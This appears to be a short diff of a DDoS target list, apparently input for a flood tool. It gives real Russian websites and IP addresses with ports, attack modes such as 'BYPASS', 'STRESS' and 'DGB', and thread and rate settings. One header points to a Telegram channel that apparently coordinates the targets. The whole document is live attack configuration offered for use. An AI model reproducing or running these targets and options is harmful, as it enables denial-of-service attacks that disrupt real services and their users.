@@ -4,7 +4,7 @@ https://213.59.254.7:443 http://213.59.253.7:80 https://213.59.253.7:443 --http-
 
 https://riafan.ru --http-methods GET BYPASS STRESS
 
-https://rusinskiimir.ru http://31.31.198.209:80 https://31.31.198.209:443 http://31.31.198.209:8080 https://31.31.198.209:8443 http://31.31.198.209:8880 -t 2000 --rpc 1000 -p 900 --http-methods BYPASS DGB --debug
+https://rusinskiimir.ru http://31.31.198.209:80 https://31.31.198.209:443 http://31.31.198.209:8080 https://31.31.198.209:8443 http://31.31.198.209:8880 --http-methods BYPASS DGB
 
 
 ### rusvesna.su https://t.me/c/1624648668/87
